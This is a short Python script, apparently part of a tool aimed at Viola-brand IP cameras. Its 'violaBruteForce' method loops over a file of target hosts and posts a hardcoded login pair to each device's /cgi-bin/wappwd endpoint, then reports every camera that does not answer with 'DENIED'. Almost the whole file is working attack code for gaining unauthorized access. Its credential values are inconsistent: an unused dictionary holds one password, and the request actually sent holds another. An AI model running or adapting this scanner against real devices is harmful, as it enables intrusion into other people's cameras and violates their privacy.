import re , os , sys , requests
import urllib.request
from host import host
class violaExploit:
    def violaExploit(self):
        print("[-]Work In Progress...")
    def violaBruteForce(self):
        expression = 'incorrect'
        ok = "OK"
        username = 'aa'
        password = '111'
        data = {'WAPLOGIN': username, 'WAPPASSWORD': password , 'PIC_SIZE': 'RES_0', 'FILEOK': 'camera.htm', 'FILEFAIL':'denied.htm', 'Submit': ok  }
        pathOs = os.path.abspath(os.path.dirname(sys.argv[0]))
        vulnerable_host = open(pathOs + '/host/host.txt', 'r').read().splitlines()
        a = 0
        while a < len(vulnerable_host):
            try:
                res = vulnerable_host[a]
                address = host.Host.addressRegex(res)
                postData = b"FILEOK=camera.htm&FILEFAIL=denied.htm&PIC_SIZE=RES_0&Submit=OK&WAPLOGIN=aa&WAPPASSWORD=11"
                url='http://' + address['ip'] + ':' + str(address['port']) + "/cgi-bin/wappwd"
                response = urllib.request.urlopen(url ,postData)
                if "DENIED" in str(response.read()):
                    pass
                else:
                    print("[-] Found  http://{0}:{1} with credential aa:11".format(address['ip'], str(address['port'])))
            except:
                pass
            a += 1
